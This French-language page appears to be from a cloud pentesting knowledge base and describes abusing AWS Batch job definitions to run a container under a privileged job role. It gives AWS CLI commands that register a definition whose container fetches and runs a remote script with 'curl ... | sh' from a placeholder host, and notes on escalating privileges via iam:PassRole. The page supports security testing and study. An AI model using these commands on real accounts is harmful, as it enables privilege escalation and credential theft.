---
order: 8
title: "Batch : définitions de jobs s'exécutant sous un rôle de job"
description: "Abuser des définitions de jobs et des environnements de calcul AWS Batch pour exécuter des conteneurs sous un rôle de job privilégié."
keywords:
  - Batch
  - définition de job
  - environnement de calcul
  - rôle de job
  - conteneur
---

# Batch

AWS Batch exécute des jobs conteneurisés sur des environnements de calcul ECS ou Fargate. Une **définition de job** fixe l'image, la commande, et un **rôle de job**, si bien qu'enregistrer ou modifier une définition puis soumettre un job exécute votre conteneur sous ce rôle, à la manière des tâches ECS.

## Exécuter un job

```bash
aws batch describe-job-definitions --status ACTIVE \
  --query 'jobDefinitions[].{n:jobDefinitionName,role:containerProperties.jobRoleArn}'

aws batch register-job-definition --job-definition-name x --type container \
  --container-properties '{"image":"<you>/img","command":["sh","-c","curl -s https://you.example/x|sh"],"jobRoleArn":"<privileged-role>","vcpus":1,"memory":512}'
aws batch submit-job --job-name x --job-queue <queue> --job-definition x
```

## Notes d'exploitation

- Fixer `jobRoleArn` à un rôle plus privilégié que l'appelant nécessite `iam:PassRole`, ce qui en fait une voie d'élévation.
- Le conteneur atteint son rôle via le point de terminaison d'identifiants de tâche ECS, comme dans [containers](containers.md).
- Une file et un environnement de calcul existants suffisent ; vous n'avez pas besoin de provisionner de l'infrastructure, seulement une définition et une soumission.

## Outils

- **AWS CLI** (`batch register-job-definition`, `submit-job`).

## Références

- [AWS: Batch IAM job roles](https://docs.aws.amazon.com/batch/latest/userguide/execution-IAM-role.html)
- [HackTricks Cloud: AWS services](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
